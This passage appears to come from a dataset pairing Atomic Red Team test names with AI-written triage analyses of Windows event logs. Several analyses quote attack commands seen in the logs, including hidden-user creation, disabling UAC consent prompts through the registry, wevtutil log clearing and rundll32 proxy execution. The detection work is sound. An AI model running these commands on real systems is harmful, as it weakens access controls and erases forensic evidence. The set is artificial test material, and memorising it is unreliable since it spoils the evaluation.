   - Frequent execution of `wevtutil.exe` for clearing logs also correlates with the suspicious activity of log clearance logs, suggesting systematic log manipulation possibly by an unauthorized actor.

5. **Edge Update and Related Executions:**
   - The logs contain extensive Microsoft Edge Update activity, which can be seen as normal; however, due to the close timing with other suspicious activities, it warrants further review to ensure it is legitimate.

**Assessment:**
Based on the observed behavior of time tampering and log clearance, which are common tactics used by threat actors to evade detection and hinder investigation, the activity reflected in the logs can be classified as **SUSPICIOUS**. These actions should not ordinarily happen on a well-maintained server without supervision and authorization.

**Recommendations:**

Headless Browser Accessing Mockbin,"Upon analyzing the provided Windows event logs, here is a detailed assessment focusing on potential indicators of compromise:

### Suspicious or Anomalous Behavior

1. **Event Log Clearing:**
   - There are multiple instances of the `wevtutil` command being used to clear critical logs, such as the Security, System, and Windows PowerShell logs by the user `admin_test` with EventIDs `1102` and `104`. Clearing of event logs can be indicative of malicious intent to hide tracks.

2. **Usage of `svchost.exe` with Time Alteration:**
   - The logs show `svchost.exe` being associated with time changes (EventID `4616`). While `svchost.exe` hosts legitimate Windows services, unusual instances where it performs non-standard operations like time changes could suggest system tampering or attempts to evade detection mechanisms that timestamp logs.

3. **Privilege Assignments:**
   - EventID `4672` in several instances denotes an assignment of special privileges to the `SYSTEM` account, including `SeDebugPrivilege`. This privilege allows for debugging and system modification and can be exploited by malware or attackers for unauthorized system access and privilege escalation.

4. **Use of PowerShell Commands:**
   - PowerShell executions are detected with commands that manipulate system components, potentially for reconnaissance or execution of scripts. The execution policy is ""Restricted"", which by itself is not suspect, but warrants attention combined with other context.

5. **Network Indicator through Malicious Command Execution:**
   - Process execution involving `cmd.exe` shows the launching of a headless Chrome browser accessing an external URL (mockbin.org). This behavior can be associated with attempts to communicate with external command-and-control servers or perform web-based reconnaissance tasks.

6. **Multiple Failed Credential Access Attempts:**
   - EventID `5379` shows attempts to access Microsoft Account services with failures noted (`ReturnCode = 3221226021`). This could indicate failed attempts to access web or cloud-associated services likely due to credentials theft attempts or testing access.

### Assessment and Recommended Resolution

The recurring theme of event log clearance combined with suspicious process execution and system manipulation strongly indicates attempts at stealthy behavior and potential system compromise. The presence of network-based command executions and alteration of system components through privileged processes is further concerning.

5. **Credential Reset:** Promptly change administrative and critical system account passwords to mitigate credential compromise.
6. **Patch and Secure:** Ensure that all systems are updated and patched for security vulnerabilities.

Given these findings, it is critical to execute swift incident response protocols to mitigate any further risk to the organization's network and data integrity."
Bypass UAC using ComputerDefaults (PowerShell),"After thoroughly analyzing the provided logs from the Application, Windows PowerShell, Sysmon, System, and Security channels, several observations can be made:

### Suspicious Activities

1. **PowerShell Suspicious Command**:
   - There are multiple PowerShell logs showing a command that is indicative of a UAC bypass technique involving registry modifications. The specific command involves manipulating the `HKCU:\software\classes\ms-settings` registry path to execute `cmd.exe` via `ComputerDefaults.exe`. This is a known technique used in attack vectors to escalate privileges.

2. **Sysmon Process Monitoring**:
   - **Process Execution**: Multiple instances of `wevtutil.exe`, a command-line utility for managing Windows event logs, were executed to clear logs (e.g., Sysmon, Application). This is typically done to cover tracks after performing malicious activities.
   - **Clearing of Event Logs**: `wevtutil.exe` is used to clear the Application, System, and Windows PowerShell logs, as evidenced by the corresponding System log events (`LogFileCleared`), which can indicate an attempt to erase traces of potentially malicious behavior.
   - **WHOAMI and HOSTNAME Commands**: Both of these executions without clear legitimate purposes could also suggest reconnaissance activities.

3. **Event Log Records**:
   - The Security log indicates that the Security event log was cleared by the user `admin_test` (Event ID 1102). This further supports the suspicion of malicious activity since clearing security logs is a common step to hide evidence of attacks.

### Benign Observations

- **Windows Defender Activity**:
  - Multiple entries showing Windows Defender in `SECURITY_PRODUCT_STATE_ON` state indicate that the system's security solution was active.

- **Microsoft Edge Update Processes**:
  - There are multiple entries related to Microsoft Edge updates. While these are benign in nature, due to the simultaneous critical events, they suggest that during the updates, other activities might have been masked.

### Assessment

Based on the evidence, the logs definitely show signs of potentially malicious activity. The specific PowerShell command execution indicates a known privilege escalation technique. Additionally, the clearing of event logs to cover tracks strongly supports this conclusion. The behavior of executing utilities that query or manipulate system configurations combined with attempts to clean operational logs are strong indicators of a compromised system.

### Resolution

**MALICIOUS** - The log files contain clear indications of malicious actions, including attempts to bypass security through privilege escalation techniques, unauthorized modification of registry settings, and deliberate deletion of security evidence through event log clearing. Immediate actions are recommended to contain and remediate the threat.

### Recommendations

1. **Immediate Investigation and Containment**:
   - Isolate the host (`Server002`) from the network to prevent further potential spread or exfiltration of data.
   - Conduct a full forensic investigation on the system to determine the extent of the compromise.

2. **Incident Response**:
   - Conduct a thorough analysis of registry changes, file modifications, and network activity to identify any malicious implants or persistence mechanisms.
   - Review other systems in the network for similar events to ensure no lateral movement or further exploitation.

3. **Post-incident Measures**:
   - Restore logs from backups and ensure strict auditing of log activities.
   - Enhance security postures, such as deploying endpoint detection and response (EDR) solutions and implementing stronger policies against PowerShell misuse.

4. **User Review and Access Control**:
   - Review user activities and permissions, especially the account `admin_test`, to ensure no anomalies in user access or privilege assignments.
   - Adjust user privileges and enforce multi-factor authentication (MFA) for critical accounts.

Overall, prioritizing these steps will help mitigate the current threat and bolster defenses against future incursions."
Masquerading - windows exe running as different windows exe,"## Detailed Analysis of Windows Event Logs

**Background:**
The logs provided span various Windows event channels including System, Sysmon, Security, Windows PowerShell, and Application logs. The focus is on detecting any indicators of malicious activity, including unusual process execution, privilege escalation, suspicious command-line arguments, and other anomalies.

### Findings:

1. **Log Clearing Activities:**
   - Multiple log entries indicate the clearing of logs at almost the same timestamp across different channels (`System`, `Security`, and `Windows PowerShell`). The responsible user is `admin_test`, as shown in the System log with EventID 104 and Security log with EventID 1102.
   - **Implication:** Log clearing is a common tactic used by attackers to erase evidence of malicious activity. This activity is inherently suspicious and merits further investigation to determine if it was authorized or indicative of compromise.

2. **Unusual PowerShell Activity:**
   - A specific PowerShell command is executing a script to copy the `cmd.exe`, rename it to `svchost.exe`, and then executing it temporarily in the user's temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\svchost.exe`) as evident in PowerShell and Sysmon logs.
   - This involves using PowerShell to `copy` and `Start-Process`, and executing a file (`svchost.exe`) which is not the legitimate system `svchost`, signifying masquerading activity.
   - **Implication:** Techniques like renaming Windows binaries and using PowerShell for execution mimicry are common indicators of malicious activity, potentially linked to an attacker trying to evade detection.

3. **Suspicious Process Execution Patterns:**
   - `wevtutil.exe` is used repeatedly to clear logs for different channels, such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`. These are all orchestrated by the same user account `admin_test`.
   - **Implication:** This pattern is typically associated with attempts to cover up tracks post-compromise.

4. **Command and Control or Exfiltration Preparation:**
   - The copying and execution of `svchost.exe` in a non-standard path and process handling via PowerShell may indicate preparation for data exfiltration or establishing persistence through a scheduled task or service masquerade.

5. **Failed Credential Access Attempts:**
   - Multiple Security logs with EventID 5379 show failed credential access for a MicrosoftAccount, possibly indicating brute force attempts or unauthorized access.
   - **Implication:** Unauthorized credential access attempts point to potential compromise efforts or reconnaissance by a threat actor on this system.

### Conclusion:
Based on the analysis of the logs, these activities collectively are consistent with malicious activity. The repeated clearing of logs, unusual PowerShell commands, and execution of potential masquerading indicates that the system is likely compromised. **Resolution: MALICIOUS**

### Recommended Actions:
- **Immediate Isolation:** Isolate Server002 from the network to prevent further damage or data exfiltration.
- **Investigate User Account:** Review the activities and access permissions for `admin_test` to determine if it is compromised.
- **Conduct Forensic Analysis:** Perform a comprehensive forensic analysis on the system to understand the full scope of the compromise.
- **Audit and Reset Credentials:** Change credentials and enhance monitoring for any unusual login activities.
- **Review and Enhance Security:** Evaluate security posture and protocols, focusing on auditing and logging configurations to prevent recurrence.

These measures will help contain the threat, understand the extent of the compromise, and prevent future incidents."
WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,"### Detailed Analysis of Windows Event Logs:

#### Overview:
The logs provided consist of events from PowerShell, Application, Sysmon, Security, and System. These logs are analyzed to identify suspicious activities that could indicate malicious intrusion or compromise.

### 1. PowerShell Logs:
- **Event ID 600** indicates the use of PowerShell commands that involve `Invoke-CimMethod` to install a package from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_VBScript.msi`.
- **Command Execution Context**: PowerShell is executing with a command line involving `Invoke-CimMethod`, often associated with administrative tasks but can be a vector for lateral movements or malicious installations.
- **Atomic Red Team Simulation**: The invocation appears to be a part of the `Atomic Red Team` testing suite (T1218.007). This suggests planned and controlled testing activity, potentially misinterpreted as malicious if not notified.

### 2. Application Logs:
- **MsiInstaller Events (IDs 1040 and 11707)** indicate the installation of an MSI package named ""Atomic Red Team Test Installer"" and its successful installation, corroborating the PowerShell activities.
- **User Context**: The user involved in the installation is `admin_test`, suggesting administrative access and intended testing by a known user.

### 3. Sysmon Logs:
- **Event ID 1** suggests multiple executions of `wevtutil.exe` to clear logs from various sources, often an indicator of log tampering to erase traces of activity. 
- **Processes such as `hostname.exe`, `whoami.exe`, `msiexec.exe`, and multiple PowerShell instances** execute under the `admin_test` account, in line with administrative or automated tasks but could indicate anomalous activities if unexpected in routine operations.
- **Hashes**: The SHA256 hashes could be verified to ensure the integrity and authenticity of these binaries.

### 4. Security and System Logs:
- **Security Log Clearing**: Event ID 1102 indicates the security log was cleared by `admin_test`, which is a significant red flag as it can indicate attempts to cover tracks.
- **Additional Log Clearances**: System logs were also cleared (Event ID 104), confirming potentially unauthorized or reckless behavior concerning log management.

### Assessment:
- **Indicators of Testing Environment**: The frequent reference to Atomic Red Team (a known adversary simulation framework) suggests these activities might be part of an authorized red team exercise or a security assessment.
- **Log Manipulation Concerns**: Despite the above, the clearing of logs (Security and System) is highly suspicious outside of strictly controlled and documented testing operations.

### Final Resolution:
The logs exhibit characteristics of a security testing or simulation exercise. Still, improper disclosure or coordination could raise alarms as potential compromise:
- **SUSPICIOUS**: The activity aligns with testing from the mention of the Atomic Red Team, yet the log clearing actions require further scrutiny and justification. Ensure the test was authorized and review security protocols surrounding such tests to prevent possible misuse or misinterpretation.

### Recommendations:
- **Confirm Authorization**: Verify with administrative and security teams if these activities were part of a sanctioned test.
- **Enhance Documentation and Communication**: Ensure any future testing is adequately documented, and stakeholders are informed to avoid panic or misinterpretation.
- **Investigate Log Clearances**: Evaluate why the logs were cleared and ensure it aligns with standard procedures. Unauthorized clearance should trigger a detailed review of account activities.
- **Implement Monitoring**: Increase monitoring and logging retention policies to counteract potential misuse of administrative tools.
"
UACME Bypass Method 23,"Upon analyzing the provided Windows event logs, several indicators of potentially malicious activity and anomalies stand out:

1. **Event Log Clearing (EventID 1102)**:
   - The Security log indicates that the event log was cleared by the user `admin_test` (EventID 1102). Clearing logs can be indicative of an attempt to cover tracks or hide activities, which is often a red flag for malicious intent.

2. **Use of `cmd.exe` and Unusual Command Line Arguments (Sysmon EventID 1)**:
   - There is a Sysmon log showing the execution of `cmd.exe` with a command line that implies the use of a known tool (`Akagi64.exe`) typically associated with privilege escalation attempts or exploitation frameworks (like UACMe). The Path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe` signals the use of a potentially suspicious payload which might be part of a red team simulation framework, however, could be misused by malicious actors.

3. **Multiple Instances of `wevtutil.exe` Clearing Event Logs (Sysmon EventID 1 and 5)**:
   - Multiple instances of `wevtutil.exe` are observed executing commands to clear logs across different channels (Application, System, Security, Windows PowerShell). This alignes with the Security EventID 1102 and is indicative of log clearing attempts, which as noted earlier can be used to hide malicious activity.

4. **Potential RED Team Simulation or Malicious Replication**:
   - The paths and tools noted (`AtomicRedTeam`, `uacme`) may suggest a Red Team exercise, but without explicit confirmation, it could also imply that a malicious actor is using publicly available penetration testing tools.

5. **Anomalous Process Creation**:
   - Processes created under high integrity levels (`cmd.exe`, `PowerShell.exe`) also correlate with actions typically seen in privilege escalation or penetration activities.

6. **No Direct Indicators in Windows PowerShell Log**:
   - The Windows PowerShell log is empty; this could be due to the clearing of logs or no PowerShell activity logged, both of which do not exclude suspicious activities.

7. **Windows Defender State Observed as On**:
   - Although Windows Defender is reported to be active, this does not negate or confirm the presence of more sophisticated malware evading detection.

### Assessment and Recommendation:

Based on the events recorded in the logs:
- The combination of log clearing, suspicious executions involving system utilities (`wevtutil.exe`), and the specific tooling paths is concerning.
- The activities suggest either a penetration testing exercise or potential malicious activities by an attacker simulating such actions.

**Resolution**: The activities logged are categorized as **MALICIOUS** given the strong evidence of log manipulation and known penetration tool usage scenarios.

**Guidance**:
- Immediate containment actions should be considered on `Server002` to prevent any potential escalation or data exfiltration.
- Verify with internal teams if any authorized Red Team exercises were being conducted during this timeframe.
- Conduct a thorough investigation of all systems and accounts accessed by `admin_test`.
- Review network logs for unusual outbound connections that might correspond with data exfiltration attempts.
- Enhance monitoring on similar patterns across your infrastructure to detect and respond swiftly to such activities.

Engage legal and incident response teams if unauthorized activity is confirmed to determine next steps appropriately."
Create a Hidden User Called $,"### Analysis:

Upon reviewing the provided event logs, several entries indicate suspicious activity that could suggest malicious behavior:

1. **Log Clearing:**
   - Events in the System log (EventID 104) and the Security log (EventID 1102) indicate that logs related to multiple channels (System, Windows PowerShell, Security) were cleared by the user ""admin_test"". Log clearing is often associated with attempts to cover tracks following unauthorized or malicious activity.

2. **User Account Manipulation:**
   - The Security log contains EventID 4720 and EventID 4722, which indicate the creation and enabling of a new user account with the name ""$"". This is suspicious since user accounts typically have meaningful names, and creating an account with a single character could be an attempt to obfuscate activities.
   - EventID 4724 indicates that the password was reset on this newly created account.

3. **Privilege Manipulation:**
   - EventID 4728 in the Security log indicates a new addition to a security-enabled global group (Domain Admins). Although it doesn’t provide which user, the correlation with the newly created user account activity might be of interest.

4. **Command Execution:**
   - In the Sysmon logs, there is a command execution involving `cmd.exe` to add a user with the command: `""cmd.exe"" /c net user $ ATOMIC123! /add /active:yes`. This command is used to create a new user account, further indicating unauthorized account creation.
   - The same process executed `net.exe` and `net1.exe`, both used for managing local users, which shows a deliberate action to manage or alter system users.

5. **Potential Cover-up:**
   - The use of `wevtutil.exe` to clear logs across several channels (`System`, `Security`, `Windows PowerShell`) is concerning as it corresponds with regular tactics used by attackers to hide malicious activities.

### Assessment:

Given the totality of the entries, the following points highlight a likely cybersecurity incident:
- The presence of multiple log-clearing activities is highly suspicious.
- The creation and manipulation of user accounts, particularly with a non-standard username and a password, suggest unauthorized access.
- Usage of tools to clear event logs and cover tracks, combined with user account activities, showcases a potential compromise.

### Resolution:

**MALICIOUS** 

### Guidance:

1. **Immediate Actions:**
   - Isolate the compromised host (Server002) from the network to prevent further unauthorized access.
   - Reset all user passwords, particularly the suspicious account created.
   - Conduct an internal audit of user accounts to ensure no unauthorized accounts remain active.

2. **Further Investigation:**
   - Review any network traffic logs or endpoint detection and response (EDR) tools for related anomalous activity.
   - Investigate other systems for similar indicators of compromise.
   - Check for data exfiltration or other malicious activities that may have occurred during the timeline of these logs.

3. **Preventive Measures:**
   - Enhance logging and monitoring capabilities.
   - Implement stricter access controls, including multifactor authentication (MFA) for administrative accounts.
   - Provide security training and awareness for all users regarding suspicious activity and proper IT procedures.

4. **Engage Incident Response:**
   - Consult with an incident response team to handle evidence gathering, forensic analysis, and system recovery."
WinPwn - UAC Bypass DiskCleanup technique,"### Analysis

Upon analyzing the provided log entries, I have identified certain activities that merit further investigation:

1. **Log Clearing Events**:
   - **Security Log ID 1102** indicates that the Windows Security log was cleared, which is a common tactic used by malicious actors to cover their tracks. The user involved is `admin_test`, which suggests potential misuse of administrative privileges.

2. **PowerShell Activity**:
   - The **PowerShell logs** highlight a suspicious script execution with the command `powershell.exe & {$S3cur3Th1sSh1t_repo...` to download and execute a script from a GitHub repository followed by a UAC bypass attempt using `DiskCleanup`. This is indicative of unauthorized activity and potential exploitation.

3. **Event Log Clearing**:
   - The **Sysmon logs** show the execution of `wevtutil.exe` with the `cl` (clear) command on multiple channels (e.g., Security, System, Application, Windows PowerShell). This further reinforces the likelihood of an attempt to erase evidence of activities that might be unauthorized or malicious.

4. **Unusual Time Synchronization and Changes**:
   - There are repeated changes to the system time settings reported in the logs, specifically related to the `svchost.exe` process. While not inherently malicious, changes to system time can correlate with obfuscation efforts.

### Assessment

Based on the combination of PowerShell activity with a UAC bypass, evidence of log tampering (across various log sources), and the potentially suspicious use of administrative access, the collected evidence is suggestive of malicious activity.

### Identified Threats
- **Potential Compromise**: The execution of a script from an unverified online source indicates a possible compromise or exploitation attempt.
- **System Integrity Risk**: Clearing event logs can impede forensic detection and response measures.
  
### Guidance and Next Steps

Given the analysis, I recommend the following actions:
- **Containment**: Isolate the affected host `Server002` from the network to prevent lateral movement.
- **Investigation**: Conduct a further in-depth investigation of the `admin_test` account activities, network traffic logs, and any associated workstations managed by the user.
- **Validation**: Verify and validate other security controls (e.g., ensure antivirus and endpoint protection systems are operational).
- **Remediation**: Consider a comprehensive review of system security posture, potential patch applications, and a review of user access privileges.
- **Monitoring**: Increase the monitoring sensitivity for this system and any connected devices to catch ongoing or future threats immediately.

### Resolution

Based on the evidence and analysis, I would categorize the activity as **MALICIOUS**. Immediate attention and remediation are required to address potential threats."
Copy and Modify Mailbox Data on Windows,"Upon thorough analysis of the provided Windows event logs, several points of interest emerge that require further scrutiny:

1. **Log Clearing Activities**:  
   - The `wevtutil.exe` command appears to have been used multiple times to clear logs (`cl` command switch indicates the clearing of logs), which is suspicious because this action often suggests an attempt to cover tracks. The channels affected include the Windows PowerShell, Application, and Security logs. The log entries indicate that this was performed by the user `SERVER002\\admin_test`.

2. **PowerShell Activities**:
   - There is a notable PowerShell script execution where operations related to directory creation, file copying, and content modification are attempted in the `C:\Users\<USERNAME>\AppData\Local\Comms\Unistore\data` directory. This script is associated with ""Atomic Red Test,"" which is a known open-source framework used for simulating adversary activities. While this by itself does not confirm malicious intent, if this execution was not authorized, it needs further investigation.

3. **Security Event ID 1102**:
   - This event indicates that the security log has been cleared. The `SubjectUserName` here is the same `admin_test` user as observed in the Sysmon and System logs, which further correlates with potentially covering up activities by removing logs.

4. **Time Change**:
   - A time change occurred as indicated by Event ID 4616 in the Security log and corroborated by Kernel-General events in the System log. The `NewTime` and `OldTime` entries show a minor change which might be part of regular time synchronization but should be confirmed as unprompted time changes are uncommon in standard operations.

From the analysis of these logs, the activities involving manual log clearing, PowerShell executions simulating adversarial behavior (especially using a toolset designed for testing), and the repeated methodical clearing of several key logs all point towards potentially malicious intent, especially given they involve a user with administrative privileges.

**Resolution**: **MALICIOUS**

**Guidance**: Further investigate the `admin_test` account and any associated sessions to determine if the account has been compromised. Review organizational policies on the execution of simulation tools like Atomic Red Team and ensure all such executions are authorized and documented. Finally, enhance monitoring and alerting on events related to log clearance, PowerShell execution with potentially harmful commands, and unauthorized time changes."
Windows Add Registry Value to Load Service in Safe Mode without Network,"### Analysis of Windows Event Logs

Upon careful analysis of the logs provided, the following points were noted:

1. **Log Clearing Events:**
   - **System Log (Event ID 104):** The logs indicate that the system logs and the Windows PowerShell logs were cleared by the user `admin_test`. This action is recorded with the command-line utility `wevtutil` (`cl` command), showing the clearing of logs at timestamps `2024-10-24 16:11:47`. Clearing logs is often considered a suspicious activity especially by users with high privilege (`admin_test` in this case) to potentially hide nefarious activities.
   - **Security Log (Event ID 1102):** Similarly, the security log was cleared by the same user. This action is even more critical as it suggests an attempt to remove traces of unauthorized or suspicious actions.

2. **Process and Command-Line Activities:**
   - Multiple instances of `wevtutil.exe` were observed in various logs. This tool was used by `admin_test` to clear the logs, as noted in the Sysmon logs with corresponding `ProcessId`s and `CommandLine` details. The usage of this utility across different channels (Sysmon, Application, and Security) further indicates systematic log clearing.
   - The presence of the `cmd.exe` with commands targeting registry keys related to SafeBoot (`HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode`) is indicative of potentially malicious intent. This can be used to alter system boot configurations stealthily.
   - The `whoami.exe` and `hostname.exe` commands appear benign in isolation but in context may have been used to gather information on the current user and system for use in further escalation.

3. **Time Manipulation:**
   - There are events indicating the alteration of system time (`EventID 4616` in Security and `EventID 1` in Kernel-General logs). This can be a technique used to mislead log timestamps or align them with external operations, potentially serving a malicious agenda.

4. **Normal System Operations:**
   - Several Microsoft Edge update processes are recorded which seem legit and are expected as part of regular software update activities. These offer no immediate malicious concerns.

### Assessment and Resolution

Given the multiple occurrences of log clearing, obscure registry modifications, time alterations, and usage of `wevtutil` by an `admin_test`, these activities raise significant red flags. They strongly suggest attempts to cover tracks and compromise system integrity, all under the guise of a privileged user account. 

Additional investigation is required to confirm possible unauthorized access or elevation of privileges and to assess any further implications or compromised assets.

Resolution: **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions:**
   - **Conduct a thorough forensic analysis** of the Server002 by retrieving memory dumps, other logs, and any remaining artifacts around the timeframe of these events.
   - **Isolate the affected system** from the network immediately to prevent potential escalation or data exfiltration.

2. **User Account Review:**
   - Investigate the `admin_test` user account for any signs of misuse or compromise, including unexpected logins or privilege escalations.
   - Revise access controls and credentials for this account and consider a password reset or disable if unauthorized access is suspected.

3. **Incident Response:**
   - Launch an incident response process involving sysadmins, network teams, and legal (if necessary) to comprehensively address the potential breach.
   - Monitor for any indicators of compromise elsewhere on the network, given the potential scope of this infiltration.

4. **Enhance Monitoring and Security Controls:**
   - Increase auditing and logging configurations to capture a more granular view of administrative actions.
   - Employ additional intrusion detection systems or SIEM solutions to automate anomaly detection.

5. **Communication and Escalation:**
   - Update management and stakeholders about the status and ongoing actions.
   - Prepare for any compliance or legal obligations as dictated by the nature of data potentially accessed. 

This analysis strongly recommends treating the situation with urgency due to the high likelihood of malicious intent and possible compromise."
Copy and Delete Mailbox Data on Windows,"Upon reviewing the provided logs, certain events stand out as potentially suspicious:

1. **Log Clearing Activity**: Several events indicate the clearing of logs across multiple channels, including System, Security, and Windows PowerShell. This activity was initiated by a user with the username `admin_test`. The `wevtutil.exe` command-line tool, which is used for managing event logs, was executed multiple times. This could indicate attempts to cover tracks by erasing event logging details after potential malicious actions.

2. **Usage of PowerShell**: A PowerShell script was run that involved creating a directory, copying files, and then removing the directory. While this could be benign, given the context of simultaneous log clearing, it raises the potential for data exfiltration or manipulation activity.

3. **Time Change Events**: The Windows Kernel-General logs show events indicating a change in system time. This is often considered suspicious, especially if conducted around or during log-clearing events, to potentially confuse the timeline of activities.

4. **Repeated Execution of Edge Update Service**: There are numerous events related to the execution of processes associated with Microsoft's Edge Update. While frequent updates might occur routinely, the coinciding timing with other suspicious activities amplifies suspicion regarding their necessity and intent, though there is no direct irregularity noted with these.

### Assessment:

Based on these observations, while the individual actions, such as the execution of `wevtutil.exe` and PowerShell commands, may have legitimate explanations in an administrative or maintenance context, their combination at similar timestamps, especially with the log-clearing activity, suggests signs of potential compromise or attempts to cover up malicious actions.

### Resolution:

**SUSPICIOUS** - The activities require further investigation to determine if they are part of legitimate operational procedures or if they indicate malicious intent. It would be prudent to:

- Verify the legitimacy of the `admin_test` user actions and determine if these activities align with known administrative tasks.
- Review any changes in system configurations or unauthorized accesses during this period.
- Assess whether PowerShell scripts or Edge updates are sanctioned and if they correlate with known maintenance tasks or installations.

Additional scrutiny should be applied to any other systems that `admin_test` accessed and to adjacent network activity for corroboration of potential threats."
Rundll32 execute command via FileProtocolHandler,"After analyzing the provided logs, I noted several elements that require attention:

1. **Clearing of Event Logs**: 
   - Multiple instances of the `wevtutil` utility being executed to clear logs, specifically targeting Microsoft-Windows-Sysmon, Security, Application, and Windows PowerShell channels as observed in the logs: `""C:\\Windows\\system32\\wevtutil.exe"" cl Security` and similar entries.
   - The clearing of event logs using administrative tools like `wevtutil` without corresponding documented changes or maintenance procedures is often a red flag in a security context as it may indicate an attempt to cover tracks.

2. **Use of `whoami.exe`**:
   - The tool `whoami.exe` was executed by the user `admin_test` within a short time frame multiple times, which might indicate privilege checks. Regular use isn't typically suspicious; however, combined with the context of log file clearing, it's worth further investigation to understand the intent.

3. **Launching of `cmd.exe` with Execution of Suspicious Command**:
   - Execution of `cmd.exe` with the command-line argument involving `rundll32.exe url.dll,FileProtocolHandler calc.exe` suggests potential misuse of rundll32 to execute a command, which might be indicative of testing or exploiting a system. While `calc.exe` is benign, the execution method is often associated with exploitation scenarios.

4. **Frequent Execution of `svchost.exe` and Sysmon Activity**:
   - Repeated Sysmon events capturing activity from `svchost.exe`, and other processes such as `MicrosoftEdgeUpdate.exe`, possibly indicating system or application updates. However, the primary concern here remains the unauthorized logs clearing, which might obscure  legitimate intentions behind these executions.

5. **Absence of PowerShell Logs**:
   - The absence of PowerShell logs despite records showing their clearing implies their potential use in this activity or their deliberate removal post-compromise efforts.

**Assessment**:
The combination of event log clearing, the execution pattern of certain Windows utilities, and suspicious command usage, especially if undocumented, suggests potentially malicious behavior. While these activities could occur under legitimate scenarios, the context, namely the clearing of security-related logs, strongly points towards a potential compromise or at least preparative actions for such an event.

**Recommendation**:
1. Conduct a thorough investigation of the current activities on `Server002`.
2. Review audit trails and security controls related to `admin_test` user account and determine if there are indicators of account compromise.
3. Check for any unauthorized changes or access patterns in critical areas around the time the logs were cleared.
4. Reinforce monitoring, especially around sensitive operations and system changes. 

**Resolution**: MALICIOUS - Logs indicate activities generally associated with malicious intent due to unauthorized log clearing and suspicious command executions."
Msiexec.exe - Execute Local MSI file with embedded VBScript,"During my analysis of the provided Windows event logs, several indicators of potentially suspicious activity were identified:

1. **Clear Evidence of Log Manipulation**:
    - The logs reveal multiple evidence of log manipulation activities. Notably, the use of the `wevtutil.exe cl` command repeatedly indicating log clearing for Sysmon, Application, System, and Security logs. This can be identified as potential tampering to cover malicious activities.

2. **PowerShell Usage with Bypass Execution Policy**:
    - The PowerShell command `powershell.exe -nop -Command Write-Host VBScript executed me!; exit` suggests a potential script execution with no profile (`-nop`), which can be used to evade detection or bypass traditional security measures.

3. **Installation of a Suspicious Package**:
    - The MSI installer logs show an installation from `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.007\bin\T1218.007_VBScript.msi`. Atomic Red Team tests are known for security testing and red-teaming exercises. However, if not authorized, this could indicate a compromise or a simulated attack scenario.

4. **Use of System Utilities from Admin Context**:
    - The repeated execution of `cmd.exe`, `msiexec.exe`, and `whoami.exe` from administrative privilege context (`High Integrity Level`) could be indicative of attempts to execute commands with elevated permissions, typical of privilege escalation or execution tactics.

5. **Time Stomping Attempt**:
    - A time discrepancy event (Event ID 4616 in Security Log and Event ID 1 in System Log) could suggest potential attempts to modify system time properties to alter file timestamps or logs, a technique known as time stomping used to evade detection.

**Assessment**:
- The series of events suggests orchestrated attempts to execute and potentially conceal unauthorized actions or simulated attacks, with activities aligning with known malicious techniques. The presence of Atomic Red Team artifacts suggests either a red team exercise or malicious actors using them as a tactic.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediate action should be taken to determine the legitimacy of the Atomic Red Team tests on this system. Verify if it was part of a controlled security assessment by your security team.
- Investigate audit trails and correlate with authorized changes or access to validate these activities.
- Examine all systems' integrity closely associated with the compromised entity.
- Strengthen logging, monitoring, and alerting around such activities to capture real-time suspicious behavior."
Disable ConsentPromptBehaviorAdmin via registry keys,"Upon reviewing the provided logs, several points of interest emerge that suggest potential malicious activity:

1. **Clearing of Event Logs**: 
   - Multiple instances of the `wevtutil.exe cl` command were executed to clear event logs, as seen in the Sysmon log entries with `CommandLine=""#text"":""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`, `CommandLine=""#text"":""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`, `CommandLine=""#text"":""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`, and `CommandLine=""#text"":""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`. Additionally, `System` and `Windows PowerShell` logs were cleared.
   - This behavior is typically suspicious as it might indicate someone trying to cover tracks after performing unauthorized or malicious actions.

2. **Registry Modification**:
   - The command `cmd.exe /c reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f` was executed. This command modifies the User Account Control (UAC) settings to ""ConsentPromptBehaviorAdmin"", which could be used to suppress administrative consent prompts, potentially allowing unauthorized privilege escalation.

3. **Time Manipulations**:
   - Several events in the logs indicate manipulation of the system time. The `EventID 4616` and `EventID 24` show the old and new times being set. Such actions can be indicative of attempts to disrupt time-based security protocols or logs.

4. **High Privileges and User Anomalies**:
   - The user `admin_test` has been seen using powerful privileges (e.g., `SeDebugPrivilege`, `SeBackupPrivilege`) on several occasions, indicating potential misuse of administrative rights.

5. **Lack of Parent Process Information**:
   - Several processes initiated by `admin_test` lack proper parent process information, which can be an indicator of process injection or other abnormal process creation methods.

The combination of log clearing, registry modifications to weaken UAC, time manipulation, and usage of high privileges by `admin_test` without a clear justification suggests potentially malicious activities rather than benign administrative tasks. These indicators, especially in concert with log file clearing actions, strongly point towards efforts to conceal illicit activities.

### Resolution:
**MALICIOUS**

### Guidance:
- Immediately isolate the affected system for a more in-depth investigation.
- Conduct a thorough forensic analysis to determine the scope and impact of the compromised activities.
- Review user `admin_test` access logs and audit trails across other systems to identify any lateral movement or privilege escalation.
- Implement more stringent monitoring and alert systems for critical events involving system changes, especially those related to event log management and UAC settings.
- Review and revise security policies and controls, ensuring that all privileged operations are logged and reviewed regularly."
Disable Windows Command Line Auditing using reg.exe,"Upon reviewing the provided Windows event logs, several key observations indicate potential suspicious activity:

1. **Log Clearing Activity**: 
   - There are multiple log clear events (Event IDs 1102 and 104) for the Security, System, and Windows PowerShell logs. The same user account, `SERVER002\admin_test`, is associated with these events.
